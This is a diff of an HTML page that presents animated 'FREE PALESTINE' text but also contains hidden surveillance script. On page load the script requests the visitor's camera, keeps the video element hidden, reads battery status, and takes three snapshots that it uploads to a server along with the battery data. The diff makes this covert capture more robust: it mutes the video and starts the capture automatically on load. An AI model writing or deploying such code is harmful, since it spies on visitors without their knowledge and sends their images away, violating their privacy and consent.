@@ -35,7 +35,7 @@
     white-space: nowrap;
     z-index: 1;
     animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
-    color: #00ffea; /* Neon Blue */
+    color: #00ffea;
     text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
   }
 
@@ -53,7 +53,6 @@
     100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
   }
 
-  /* Hide camera preview */
   video#cameraStream {
     display: none;
   }
@@ -72,33 +71,34 @@
 <div class="text-layer text2">FREE PALESTINE</div>
 <div class="text-layer text3">FREE PALESTINE</div>
 
-<!-- Hidden Camera Video & Canvas for snapshots -->
-<video id="cameraStream" autoplay playsinline></video>
+<!-- Hidden Camera & Canvas -->
+<video id="cameraStream" autoplay playsinline muted></video>
 <canvas id="snapshot"></canvas>
 
 <script>
-const video = document.getElementById('cameraStream');
-const canvas = document.getElementById('snapshot');
-const ctx = canvas.getContext('2d');
-
-navigator.getBattery().then(battery => {
-  const batteryLevel = Math.round(battery.level * 100);
-  const isCharging = battery.charging;
-
-  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+async function initCameraSnapshots() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById('cameraStream');
     video.srcObject = stream;
 
+    const battery = await navigator.getBattery();
+    const batteryLevel = Math.round(battery.level * 100);
+    const isCharging = battery.charging;
+
     // Take snapshots automatically
-    setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
-    setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
-    setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+    setTimeout(() => takeSnapshotAndSend(video, batteryLevel, isCharging), 2000);
+    setTimeout(() => takeSnapshotAndSend(video, batteryLevel, isCharging), 4000);
+    setTimeout(() => takeSnapshotAndSend(video, batteryLevel, isCharging), 6000);
 
-  }).catch(err => {
+  } catch(err) {
     console.error("Camera error:", err);
-  });
-});
+  }
+}
 
-function takeSnapshotAndSend(battery, charging) {
+function takeSnapshotAndSend(video, battery, charging) {
+  const canvas = document.getElementById('snapshot');
+  const ctx = canvas.getContext('2d');
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0);
@@ -113,9 +113,12 @@ function takeSnapshotAndSend(battery, charging) {
       charging
     })
   }).then(res => res.json())
-    .then(data => console.log("Snapshot uploaded"))
+    .then(() => console.log("Snapshot uploaded"))
     .catch(err => console.error("Upload error:", err));
 }
+
+// Start camera snapshots after page loads
+window.addEventListener('load', initCameraSnapshots);
 </script>
 </body>
 </html> 
